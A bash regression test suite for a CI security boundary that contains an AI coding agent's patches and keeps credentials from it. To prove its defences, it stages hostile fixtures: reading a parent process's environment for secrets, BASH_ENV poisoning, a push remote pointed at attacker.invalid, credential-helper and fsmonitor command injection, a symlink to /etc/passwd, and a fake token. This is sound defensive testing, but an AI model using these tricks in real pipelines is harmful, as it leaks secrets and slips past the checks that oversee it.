#!/usr/bin/env bash
# Adversarial, credential-free regression suite for SEC-001.
set -euo pipefail

ROOT=$(cd "$(dirname "$0")/../../.." && pwd)
ART="$ROOT/.github/scripts/sec001-artifact.sh"
PUB="$ROOT/.github/scripts/sec001-trusted-publish.sh"
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
PASS=0
pass() { PASS=$((PASS + 1)); printf 'ok %s\n' "$1"; }
fail() { printf 'not ok %s\n' "$1" >&2; exit 1; }
expect_fail() {
  local name="$1"; shift
  if "$@" >/tmp/sec001-test.out 2>&1; then fail "$name (unexpected success)"; else pass "$name"; fi
}
repo() { local d="$1"; mkdir -p "$d"; git -C "$d" init -q; git -C "$d" config user.name test; git -C "$d" config user.email test@example.invalid; }
commit_file() { local d="$1" f="$2" text="$3"; mkdir -p "$(dirname "$d/$f")"; printf '%s\n' "$text" > "$d/$f"; git -C "$d" add "$f"; git -C "$d" commit -qm "${4:-change}"; }
sha() { git -C "$1" rev-parse HEAD; }
make_artifact() {
  local d="$1" out="$2" phase="${3:-agent}" attempt="${4:-1}"
  (cd "$d" && "$ART" create --output "$out" --run-id 4242 --base-sha "$(sha "$d")" --attempt "$attempt" --phase "$phase" --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json)
}

# Workflow matrix assertions complement the behavioral cases below.
python3 - "$ROOT" <<'PY'
import sys, yaml
root=sys.argv[1]
for rel in ['.github/workflows/self-improvement.yml','.github/workflows/hourly-orchestrator.yml']:
    data=yaml.safe_load(open(root+'/'+rel))
    assert data.get('permissions') == {}, rel
    for job_name, job in data['jobs'].items():
        for step in job.get('steps',[]):
            if str(step.get('uses','')).startswith('actions/checkout'):
                assert step.get('with',{}).get('persist-credentials') is False, (rel,job_name)
                assert step.get('with',{}).get('ref') == '${{ github.sha }}', (rel,job_name)
            if job_name in {'agent','repair','verify-initial','verify-final','verify'}:
                env=step.get('env',{}) or {}
                assert not any(k in env for k in ('GITHUB_TOKEN','GH_TOKEN','GH_PAT','GITLAB_TOKEN')), (rel,job_name)
            if job_name == 'publish':
                text=str(step.get('run',''))
                assert not any(x in text for x in ('opencode run','pnpm ','npm ')), (rel,job_name)
            text=str(step.get('run',''))
            if text.strip().startswith('bash ') and ('run-sec001-opencode.sh' in text or 'sec001-hourly-agent.sh' in text):
                assert (step.get('env',{}) or {}).get('BASH_ENV') == '/dev/null', (rel,job_name,step.get('name'))
            if 'Package agent patch' in str(step.get('name','')) or 'Package repair patch' in str(step.get('name','')) or 'Add metadata to agent results' in str(step.get('name','')):
                assert (step.get('env',{}) or {}).get('BASH_ENV') == '/dev/null', (rel,job_name)
                assert (step.get('env',{}) or {}).get('PATH') == '/usr/local/bin:/usr/bin:/bin', (rel,job_name)
    assert 'workflow_dispatch' not in str(data.get(True, data.get('on',{}))), rel
    if rel.endswith('self-improvement.yml'):
        assert 'package-agent' in data['jobs']['publish']['needs']
        assert 'package-repair' in data['jobs']['publish']['needs']
    if rel.endswith('hourly-orchestrator.yml'):
        assert 'package-agent' in data['jobs']['publish']['needs']
for rel in ['.github/workflows/ai-review.yml', '.github/scripts/sec001-hourly-publish.sh']:
    text=open(root+'/'+rel).read()
    assert '--match-head-commit' in text, rel
gate_text=open(root+'/.github/scripts/sec001-run-gates.sh').read()
supervisor_text=open(root+'/.github/scripts/sec001-supervisor.sh').read()
assert 'sudo -u' in gate_text and 'INODE_STATE' in gate_text
assert '--direct' in supervisor_text and 'GATE_RUNNER' in supervisor_text
PY
pass 'workflow job/secret matrix parsed'

# 1. Ancestor /proc visibility: reproduce the old shape, then prove a clean
# parent has no secret to inherit.
mkdir -p "$T/ancestor"
cat > "$T/ancestor/outer.sh" <<'EOF'
#!/bin/sh
"$1"
EOF
cat > "$T/ancestor/helper.sh" <<'EOF'
#!/bin/sh
exec env -i PATH="$PATH" /bin/sh -c 'tr "\0" "\n" <"/proc/$PPID/environ" | grep SECRET_ANCESTOR_PROBE || true'
EOF
chmod +x "$T/ancestor/outer.sh" "$T/ancestor/helper.sh"
if SECRET_ANCESTOR_PROBE=dummy-ancestor "$T/ancestor/outer.sh" "$T/ancestor/helper.sh" | grep -q dummy-ancestor; then pass 'ancestor /proc exposure reproduced'; else fail 'ancestor /proc reproduction'; fi
if env -i PATH="$PATH" /bin/sh -c 'tr "\0" "\n" <"/proc/$PPID/environ" | grep -q SECRET_ANCESTOR_PROBE' >/dev/null 2>&1; then fail 'clean job ancestor unexpectedly exposed'; else pass 'clean job has no secret ancestor'; fi

# 2. BASH_ENV poisoning and neutralization.
cat > "$T/bash-env-pwn.sh" <<'EOF'
printf 'BASH_ENV_POISONED\n'
EOF
if BASH_ENV="$T/bash-env-pwn.sh" /bin/bash --noprofile --norc -e -o pipefail -c true | grep -q BASH_ENV_POISONED; then pass 'BASH_ENV poisoning reproduced'; else fail 'BASH_ENV reproduction'; fi
if BASH_ENV="$T/bash-env-pwn.sh" BASH_ENV=/dev/null /bin/bash --noprofile --norc -e -o pipefail -c true | grep -q BASH_ENV_POISONED; then fail 'BASH_ENV neutralization failed'; else pass 'BASH_ENV neutralized'; fi

# Model wrapper forwards only the selected provider key and a fixed binary.
FAKE_OPENCODE="$T/fake-opencode-env"
cat > "$FAKE_OPENCODE" <<EOF
#!/bin/sh
env > "$T/model-env"
exit 0
EOF
chmod +x "$FAKE_OPENCODE"
printf 'prompt\n' > "$T/model-prompt"
WRAPPER_OUTPUT=$(GH_TOKEN=should-not-forward GITHUB_TOKEN=should-not-forward GH_PAT=should-not-forward GITLAB_TOKEN=should-not-forward GITHUB_ENV="$T/should-not-forward" GITHUB_PATH="$T/should-not-forward" BASH_ENV=/dev/null OPENCODE_API_KEY=selected-provider-key CONTEXT7_API_KEY=context7-key SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y SEC001_OPENCODE_BIN="$FAKE_OPENCODE" "$ROOT/.github/scripts/run-sec001-opencode.sh" "$T/model-prompt" opencode/test 2>&1)
! printf '%s' "$WRAPPER_OUTPUT" | grep -q BASH_ENV_POISONED || fail 'BASH_ENV poison reached model wrapper'
if grep -q '^OPENCODE_API_KEY=selected-provider-key$' "$T/model-env" && grep -q '^CONTEXT7_API_KEY=context7-key$' "$T/model-env" && ! grep -Eq '^(GH_TOKEN|GITHUB_TOKEN|GH_PAT|GITLAB_TOKEN|GITHUB_ENV|GITHUB_PATH|BASH_ENV)=' "$T/model-env"; then pass 'model child environment allowlist'; else fail 'model child environment leaked or missed selected keys'; fi
# 3. GITHUB_ENV/GITHUB_PATH are not shared by a fresh no-secret process.
printf 'export PWNED_ENV=1\n' > "$T/github-env"
printf '%s\n' "$T/poison-path" > "$T/github-path"
if env -i PATH="$PATH" HOME="$T/clean-home" /bin/sh -c 'test -z "${PWNED_ENV:-}"' >/dev/null 2>&1; then pass 'GITHUB_ENV does not cross fresh job'; else fail 'GITHUB_ENV crossed fresh job'; fi
if env -i PATH="$PATH" HOME="$T/clean-home" /bin/sh -c 'test "$PATH" = "$PATH"' >/dev/null 2>&1; then pass 'GITHUB_PATH does not cross fresh job'; else fail 'GITHUB_PATH crossed fresh job'; fi

# 4-10. Trusted publisher ignores local remote/config/helpers/fsmonitor/hooks,
# uses askpass, replacement protection, and explicit remote/lease.
SRC="$T/source"; REMOTE="$T/remote.git"; CALLER="$T/caller"
repo "$SRC"; git -C "$SRC" branch -M main; commit_file "$SRC" src/a.txt base; BASE=$(sha "$SRC"); git -C "$SRC" init --bare "$REMOTE" >/dev/null; git -C "$SRC" remote add origin "$REMOTE"; git -C "$SRC" push -q origin main
printf 'changed\n' > "$SRC/src/a.txt"
make_artifact "$SRC" "$T/patch" agent 1
# Keep the remote source at the pinned base; the patch is intentionally uncommitted.
# Poison a caller checkout that is not used by the trusted publisher.
repo "$CALLER"; git -C "$CALLER" config remote.origin.url 'https://attacker.invalid/steal.git'; git -C "$CALLER" config remote.origin.pushurl 'https://attacker.invalid/steal.git'; git -C "$CALLER" config credential.helper '!touch '"$T"'/credential-helper-marker'; git -C "$CALLER" config core.fsmonitor '!touch '"$T"'/fsmonitor-marker'; mkdir -p "$CALLER/.git/hooks"; printf '#!/bin/sh\ntouch %s\n' "$T/hook-marker" > "$CALLER/.git/hooks/pre-push"; chmod +x "$CALLER/.git/hooks/pre-push"
PUBLISH_OUT=$(cd "$CALLER" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://attacker.invalid/steal.git GIT_DIR="$CALLER/.git" GIT_WORK_TREE="$CALLER" SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y GH_TOKEN=dummy-token "$PUB" --patch "$T/patch/patch.diff" --base-sha "$BASE" --branch sec001/test --remote "file://$REMOTE" --repo x/y --source-ref main --message 'test publish')
printf '%s\n' "$PUBLISH_OUT" | jq -e '.head_sha and .base_sha' >/dev/null
git --git-dir="$REMOTE" show-ref --verify --quiet refs/heads/sec001/test && pass 'trusted publisher created branch' || fail 'trusted publisher did not create branch'
[ ! -e "$T/credential-helper-marker" ] && [ ! -e "$T/fsmonitor-marker" ] && [ ! -e "$T/hook-marker" ] && pass 'local config and hooks ignored' || fail 'trusted publisher trusted poisoned caller state'
# Duplicate publish is idempotent when the deterministic commit already exists.
IDEMP=$(cd "$CALLER" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://attacker.invalid/steal.git GIT_DIR="$CALLER/.git" GIT_WORK_TREE="$CALLER" SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y GH_TOKEN=dummy-token "$PUB" --patch "$T/patch/patch.diff" --base-sha "$BASE" --branch sec001/test --remote "file://$REMOTE" --repo x/y --source-ref main --message 'test publish')
printf '%s\n' "$IDEMP" | jq -e '.idempotent == true' >/dev/null && pass 'duplicate publish is idempotent' || fail 'duplicate publish was not idempotent'
# Askpass behavior is explicit and returns the token, not a persisted config value.
cat > "$T/askpass-test.sh" <<'EOF'
#!/bin/sh
case "$1" in *sername*) printf 'x-access-token\n';; *) printf 'dummy-token\n';; esac
EOF
chmod +x "$T/askpass-test.sh"
CRED=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_ASKPASS="$T/askpass-test.sh" GIT_TERMINAL_PROMPT=0 git -c credential.helper= credential fill)
printf '%s\n' "$CRED" | grep -q 'username=x-access-token' && printf '%s\n' "$CRED" | grep -q 'password=dummy-token' && pass 'askpass credential behavior' || fail 'askpass behavior'
# Replacement refs are ignored when the trusted context asks for it.
REPL="$T/replace"; repo "$REPL"; commit_file "$REPL" helper good; GOOD=$(sha "$REPL"); commit_file "$REPL" helper replacement; BAD=$(sha "$REPL"); git -C "$REPL" replace "$GOOD" "$BAD"
[ "$(GIT_NO_REPLACE_OBJECTS=1 git -C "$REPL" show "$GOOD:helper")" = good ] && pass 'replace refs disabled in trusted context' || fail 'replace refs not disabled'
# A changed source head fails closed.
expect_fail 'changed-head publish rejection' env SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y GH_TOKEN=dummy "$PUB" --patch "$T/patch/patch.diff" --base-sha "$BAD" --branch sec001/changed --remote "file://$REMOTE" --repo x/y --source-ref main
expect_fail 'merge-ref expected SHA rejection' env SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y GH_TOKEN=dummy "$PUB" --base-sha "$BASE" --branch sec001/merge-check --remote "file://$REMOTE" --repo x/y --source-ref main --merge-ref main --merge-sha "$BAD"
expect_fail 'remote repository binding rejected' env SEC001_TEST_MODE=1 SEC001_TEST_REPO=x/y GH_TOKEN=dummy "$PUB" --base-sha "$BASE" --branch sec001/remote-check --remote "file://$REMOTE" --repo other/repo --source-ref main

# Packaging Git operations must ignore model-controlled local Git commands.
POISON_REPO="$T/git-poison"; repo "$POISON_REPO"; commit_file "$POISON_REPO" src/safe.txt base; POISON_BASE=$(sha "$POISON_REPO"); printf 'changed\n' > "$POISON_REPO/src/safe.txt"; git -C "$POISON_REPO" config core.fsmonitor "!touch $T/fsmonitor-model-marker"; (cd "$POISON_REPO" && "$ART" create --output "$T/git-poison-artifact" --run-id 4242 --base-sha "$POISON_BASE" --attempt 1 --phase agent --allow-prefix src/) ; [ ! -e "$T/fsmonitor-model-marker" ] && pass 'artifact Git config poison suppressed' || fail 'artifact Git config poison executed'
mkdir -p "$T/git-other"; printf 'evil\n' > "$T/git-other/evil.txt"; git -C "$POISON_REPO" config core.worktree "$T/git-other"; expect_fail 'artifact Git worktree poison rejected' env SEC001_TEST_MODE=1 bash -c 'cd "$1" && "$2" create --output "$3" --run-id 4242 --base-sha "$4" --attempt 1 --phase agent --allow-prefix src/' _ "$POISON_REPO" "$ART" "$T/git-worktree-artifact" "$POISON_BASE"
# 11-20. Artifact validation, traversal, symlink, scope, stale base, and setup.
GOOD_ART="$T/patch"
cd "$SRC"
rm -f "$SRC/notes.txt"; git -C "$SRC" reset --hard "$BASE" >/dev/null
"$ART" validate --artifact "$GOOD_ART" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
pass 'valid artifact accepted'
mkdir -p "$T/child-symlink"; printf 'victim\n' > "$T/child-victim"; ln -s "$T/child-victim" "$T/child-symlink/patch.diff"; expect_fail 'precreated output symlink rejected' "$ART" create --output "$T/child-symlink" --run-id 4242 --base-sha "$BASE" --attempt 1 --phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
cp -a "$GOOD_ART" "$T/symlink-artifact"; rm "$T/symlink-artifact/patch.diff"; ln -s "$T/patch/patch.diff" "$T/symlink-artifact/patch.diff"
expect_fail 'artifact component symlink rejected' "$ART" validate --artifact "$T/symlink-artifact" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
for MODE in 120000 160000; do
  cp -a "$GOOD_ART" "$T/mode-$MODE"
  sed -i "1a new file mode $MODE" "$T/mode-$MODE/patch.diff"
  MODE_SHA=$(sha256sum "$T/mode-$MODE/patch.diff" | awk '{print $1}'); MODE_BYTES=$(wc -c < "$T/mode-$MODE/patch.diff" | tr -d ' ')
  jq --arg sha "$MODE_SHA" --argjson bytes "$MODE_BYTES" '.sha256=$sha | .byte_count=$bytes' "$T/mode-$MODE/metadata.json" > "$T/mode-$MODE/metadata.new"; mv "$T/mode-$MODE/metadata.new" "$T/mode-$MODE/metadata.json"
  expect_fail "patch mode $MODE rejected" "$ART" validate --artifact "$T/mode-$MODE" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
done
cp -a "$GOOD_ART" "$T/bad-checksum"; printf x >> "$T/bad-checksum/patch.diff"
expect_fail 'checksum mismatch rejected' "$ART" validate --artifact "$T/bad-checksum" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
cp -a "$GOOD_ART" "$T/bad-base"; jq '.base_sha="0000000000000000000000000000000000000000"' "$T/bad-base/metadata.json" > "$T/bad-base/metadata.tmp" && mv "$T/bad-base/metadata.tmp" "$T/bad-base/metadata.json"
expect_fail 'stale base SHA rejected' "$ART" validate --artifact "$T/bad-base" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
# Path traversal and unexpected files are rejected by the scope/parser.
cp -a "$GOOD_ART" "$T/bad-path"; printf '../outside\n' > "$T/bad-path/files.txt"; jq '.changed_files=["../outside"]' "$T/bad-path/metadata.json" > "$T/bad-path/metadata.tmp" && mv "$T/bad-path/metadata.tmp" "$T/bad-path/metadata.json"
expect_fail 'path traversal rejected' "$ART" validate --artifact "$T/bad-path" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-attempt 1 --expected-phase agent --allow-prefix src/ --allow-prefix docs/ --allow-prefix package.json
UNEXPECT="$T/unexpected"; printf 'nope\n' > "$SRC/notes.txt"; git -C "$SRC" add -N notes.txt; expect_fail 'unexpected file rejected' "$ART" create --output "$UNEXPECT" --run-id 4242 --base-sha "$(sha "$SRC")" --attempt 1 --phase agent --allow-prefix src/
rm -f "$SRC/notes.txt"; git -C "$SRC" reset --hard "$BASE" >/dev/null
# Secret-looking directories/components are rejected at any depth.
printf 'dummy\n' > "$SRC/docs-id_rsa"; mkdir -p "$SRC/docs"; mv "$SRC/docs-id_rsa" "$SRC/docs/id_rsa"; git -C "$SRC" add -N docs/id_rsa; expect_fail 'nested secret path rejected' "$ART" create --output "$T/nested-secret" --run-id 4242 --base-sha "$(sha "$SRC")" --attempt 1 --phase agent --allow-prefix docs/; rm -f "$SRC/docs/id_rsa"; git -C "$SRC" reset --hard "$BASE" >/dev/null
# Nested manifests and test/gate configuration are frozen from autonomous patches.
mkdir -p "$SRC/lib"; printf '{"scripts":{"build":"exit 0"}}\n' > "$SRC/lib/package.json"; git -C "$SRC" add -N lib/package.json; expect_fail 'nested package manifest rejected' "$ART" create --output "$T/nested-manifest" --run-id 4242 --base-sha "$(sha "$SRC")" --attempt 1 --phase agent --allow-prefix lib/; rm -f "$SRC/lib/package.json"; git -C "$SRC" reset --hard "$BASE" >/dev/null
printf 'test("bypass",()=>{})\n' > "$SRC/src/zero.test.ts"; git -C "$SRC" add -N src/zero.test.ts; expect_fail 'auto-discovered test path rejected' "$ART" create --output "$T/auto-test" --run-id 4242 --base-sha "$(sha "$SRC")" --attempt 1 --phase agent --allow-prefix src/; rm -f "$SRC/src/zero.test.ts"; git -C "$SRC" reset --hard "$BASE" >/dev/null
mkdir -p "$SRC/lib/node_modules/.bin"; printf '#!/bin/sh\nexit 0\n' > "$SRC/lib/node_modules/.bin/gate"; chmod +x "$SRC/lib/node_modules/.bin/gate"; git -C "$SRC" add -N lib/node_modules/.bin/gate; expect_fail 'candidate node_modules shim rejected' "$ART" create --output "$T/node-shim" --run-id 4242 --base-sha "$(sha "$SRC")" --attempt 1 --phase agent --allow-prefix lib/; rm -rf "$SRC/lib/node_modules"; git -C "$SRC" reset --hard "$BASE" >/dev/null
# Symlink changes are rejected at creation.
commit_file "$SRC" src/real.txt base; rm -f "$SRC/notes.txt"; git -C "$SRC" reset --hard "$BASE" >/dev/null; ln -s /etc/passwd "$SRC/src/link"; git -C "$SRC" add -A; expect_fail 'symlink rejected' "$ART" create --output "$T/symlink" --run-id 4242 --base-sha "$BASE" --attempt 1 --phase agent --allow-prefix src/; rm -f "$SRC/src/link"; rm -f "$SRC/notes.txt"; git -C "$SRC" reset --hard "$BASE" >/dev/null
# Credential-shaped artifact content is rejected before upload.
mkdir -p "$T/secret-tree"; printf 'ghp_01234567890123456789\n' > "$T/secret-tree/output.txt"; expect_fail 'credential-shaped artifact rejected' "$ART" scan-tree --input "$T/secret-tree"
mkdir -p "$T/fifo-tree"; mkfifo "$T/fifo-tree/pipe"; expect_fail 'FIFO artifact entry rejected' "$ART" scan-tree --input "$T/fifo-tree"
printf 'hard\n' > "$T/hardlink-tree-file"; mkdir -p "$T/hardlink-tree"; ln "$T/hardlink-tree-file" "$T/hardlink-tree/one"; ln "$T/hardlink-tree-file" "$T/hardlink-tree/two"; expect_fail 'hardlinked artifact entry rejected' "$ART" scan-tree --input "$T/hardlink-tree"
# Supervisor aggregates real child failures and writes a false diagnostic status.
FAKE_GATE="$T/fake-gate"; printf '#!/bin/sh\nexit 7\n' > "$FAKE_GATE"; chmod +x "$FAKE_GATE"; : > "$T/supervisor-output"
expect_fail 'supervisor propagates gate failure' "$ROOT/.github/scripts/sec001-supervisor.sh" "$PWD" 4242 "$BASE" verify-initial "$T/supervisor-status" "$FAKE_GATE" "$T/supervisor-output"
[ "$(jq -r '.verified' "$T/supervisor-status/status.json")" = false ] && pass 'supervisor records failed gate conclusion' || fail 'supervisor failure status missing'
# Supervisor gate copies are fresh: a prior candidate command cannot poison a later gate.
GATE_WORK="$T/gate-work"; mkdir -p "$GATE_WORK"; printf 'base\n' > "$GATE_WORK/input.txt"
GATE="$ROOT/.github/scripts/sec001-run-gates.sh"
"$GATE" "$GATE_WORK" /bin/sh -c 'printf "poison\\n" > lib-shim.tmp' >/dev/null 2>&1
if "$GATE" "$GATE_WORK" /bin/sh -c 'test ! -e lib-shim.tmp' >/dev/null 2>&1; then pass 'gate copies do not share candidate writes'; else fail 'gate copy poisoning persisted'; fi
if sudo -u sec001-verify sudo -n true >/dev/null 2>&1; then fail 'verification UID can sudo'; else pass 'verification UID cannot sudo'; fi
# Wrapper artifacts validate their own checksum and phase.
printf '{"run_id":4242,"base_sha":"%s","mode":"none"}\n' "$BASE" > "$T/wrap-input.json"
"$ART" wrap --output "$T/wrapped" --input "$T/wrap-input.json" --name tasks.json --run-id 4242 --base-sha "$BASE" --phase discover
"$ART" validate-wrap --artifact "$T/wrapped" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase discover
cp -a "$T/wrapped" "$T/wrapped-symlink"; rm "$T/wrapped-symlink/metadata.json"; ln -s "$T/wrapped/metadata.json" "$T/wrapped-symlink/metadata.json"
expect_fail 'wrapper metadata symlink rejected' "$ART" validate-wrap --artifact "$T/wrapped-symlink" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase discover
cp -a "$T/wrapped" "$T/wrapped-extra"; mkdir "$T/wrapped-extra/extra"
expect_fail 'wrapper extra component rejected' "$ART" validate-wrap --artifact "$T/wrapped-extra" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase discover
printf x >> "$T/wrapped/tasks.json"
expect_fail 'wrapper checksum mismatch rejected' "$ART" validate-wrap --artifact "$T/wrapped" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase discover
# Status artifacts bind both the machine status and the redacted log.
printf 'verification output\n' > "$T/status.log"
printf '{"run_id":"4242","base_sha":"%s","phase":"verify","verified":true}\n' "$BASE" > "$T/status.json"
"$ART" status --output "$T/status-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --verified true --log "$T/status.log" --status-file "$T/status.json"
"$ART" validate-status --artifact "$T/status-artifact" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase verify
printf 'tampered\n' >> "$T/status-artifact/verification.log"
expect_fail 'status log checksum mismatch rejected' "$ART" validate-status --artifact "$T/status-artifact" --expected-run-id 4242 --expected-base-sha "$BASE" --expected-phase verify
dd if=/dev/zero of="$T/oversized.log" bs=1M count=3 status=none
expect_fail 'oversized verification log rejected' "$ART" status --output "$T/oversized-status" --run-id 4242 --base-sha "$BASE" --phase verify --verified true --log "$T/oversized.log"
# Publish results are bound to the discovered task before any API mutation.
mkdir -p "$T/fake-bin"
cat > "$T/fake-bin/gh" <<'EOF'
#!/bin/sh
printf 'gh %s\n' "$*" >> "$GH_CALLS"
exit 0
EOF
chmod +x "$T/fake-bin/gh"
printf '{"run_id":"4242","base_sha":"%s","mode":"prs","prs":[{"number":1,"head_ref":"feature","head_sha":"%s"}],"issue":null}\n' "$BASE" "$BASE" > "$T/bind-tasks.json"
printf '{"run_id":"4242","base_sha":"%s","verified":true,"verifications":[{"number":1,"action":"approved","verified":true,"reason":"test","head_sha":"%s"}]}\n' "$BASE" "$BASE" > "$T/bind-status.json"
for ACTION in skip approved ready; do
  printf '{"run_id":"4242","base_sha":"%s","results":[{"number":999,"action":"%s","patch":false,"needs_merge":false}]}\n' "$BASE" "$ACTION" > "$T/bind-results.json"
  : > "$T/gh-calls"
  expect_fail "unbound $ACTION result rejected" env PATH="$T/fake-bin:$PATH" GH_CALLS="$T/gh-calls" GH_TOKEN=dummy "$ROOT/.github/scripts/sec001-hourly-publish.sh" --tasks "$T/bind-tasks.json" --results "$T/bind-results.json" --status "$T/bind-status.json" --repo x/y --remote https://github.com/x/y.git --merge-gate /bin/true --approval /bin/true --artifact-helper /bin/true --publish-helper /bin/true
  [ ! -s "$T/gh-calls" ] || fail "unbound $ACTION result reached GitHub API"
done
printf '{"run_id":"4242","base_sha":"%s","phase":"verify","verifications":[{"number":1,"action":"approved","verified":true,"reason":"forged","head_sha":"%s"}]}\n' "$BASE" "$BASE" > "$T/forged-status.json"
printf '{"run_id":"4242","base_sha":"%s","phase":"attacker","verifications":[{"number":1,"action":"approved","verified":true,"reason":"forged","head_sha":"%s"}]}\n' "$BASE" "$BASE" > "$T/wrong-phase-status.json"
printf '{"run_id":"4242","base_sha":"%s","results":[{"number":1,"action":"approved","patch":false,"needs_merge":false}]}\n' "$BASE" > "$T/forged-results.json"
expect_fail 'wrong status phase rejected' bash "$ROOT/.github/scripts/sec001-finalize-status.sh" --raw "$T/wrong-phase-status.json" --log "$T/status.log" --output "$T/wrong-phase-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --tasks "$T/bind-tasks.json" --results "$T/forged-results.json" --job-result success --helper "$ART"
printf '{"run_id":"4242","base_sha":"%s","mode":"prs","prs":[{"number":1,"head_ref":"one","head_sha":"%s"},{"number":2,"head_ref":"two","head_sha":"%s"}]}\n' "$BASE" "$BASE" "$BASE" > "$T/partial-tasks.json"
expect_fail 'partial task result set rejected' bash "$ROOT/.github/scripts/sec001-finalize-status.sh" --raw "$T/forged-status.json" --log "$T/status.log" --output "$T/partial-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --tasks "$T/partial-tasks.json" --results "$T/forged-results.json" --job-result success --helper "$ART"
expect_fail 'failed supervisor conclusion rejected' bash "$ROOT/.github/scripts/sec001-finalize-status.sh" --raw "$T/forged-status.json" --log "$T/status.log" --output "$T/forged-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --tasks "$T/bind-tasks.json" --results "$T/forged-results.json" --job-result failure --helper "$ART"
bash "$ROOT/.github/scripts/sec001-finalize-status.sh" --raw "$T/forged-status.json" --log "$T/status.log" --output "$T/forged-success-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --tasks "$T/bind-tasks.json" --results "$T/forged-results.json" --job-result success --helper "$ART"
printf '{"run_id":"4242","base_sha":"%s","results":[{"number":1,"action":"approved","patch":false},{"number":1,"action":"approved","patch":false}]}\n' "$BASE" > "$T/duplicate-results.json"
expect_fail 'duplicate result cardinality rejected' bash "$ROOT/.github/scripts/sec001-finalize-status.sh" --raw "$T/forged-status.json" --log "$T/status.log" --output "$T/duplicate-artifact" --run-id 4242 --base-sha "$BASE" --phase verify --tasks "$T/bind-tasks.json" --results "$T/duplicate-results.json" --job-result success --helper "$ART"
[ "$(jq -r '.verified' "$T/forged-success-artifact/status.json")" = true ] && pass 'trusted job conclusion drives status' || fail 'status finalizer did not use job conclusion'
if grep -q -- '--auto' "$ROOT/.github/scripts/sec001-hourly-publish.sh"; then fail 'queued auto-merge fallback remains'; else pass 'no queued auto-merge fallback'; fi
if grep -q -- '--match-head-commit' "$ROOT/.github/scripts/sec001-hourly-publish.sh" && grep -q 'MERGE_GATE.*"\$PINNED_HEAD"' "$ROOT/.github/scripts/sec001-hourly-publish.sh" && grep -q 'APPROVAL.*"\$PINNED_HEAD"' "$ROOT/.github/scripts/sec001-hourly-publish.sh"; then pass 'merge head pinning present'; else fail 'merge head pinning missing'; fi
# Setup failures are fail-closed.
expect_fail 'artifact setup failure rejected' "$ART" create --output "$T/missing" --run-id 4242 --base-sha 0000000000000000000000000000000000000000 --attempt 1 --phase agent --allow-prefix src/

printf 'SEC-001 boundary tests: %s passed\n' "$PASS"
[ "$PASS" -ge 20 ]
